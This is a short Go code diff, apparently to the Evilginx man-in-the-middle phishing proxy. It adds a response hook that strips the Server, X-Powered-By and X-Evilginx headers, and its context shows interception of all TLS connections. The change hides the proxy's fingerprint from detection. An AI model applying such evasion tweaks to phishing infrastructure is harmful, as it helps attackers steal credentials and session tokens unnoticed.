@@ -160,6 +160,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		p.Proxy.ServeHTTP(w, req)
 	})
 
+	p.Proxy.OnResponse().DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
+		resp.Header.Del("Server")
+		resp.Header.Del("X-Powered-By")
+		resp.Header.Del("X-Evilginx")
+		return resp
+	})
+
 	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
 
 	p.Proxy.OnRequest().
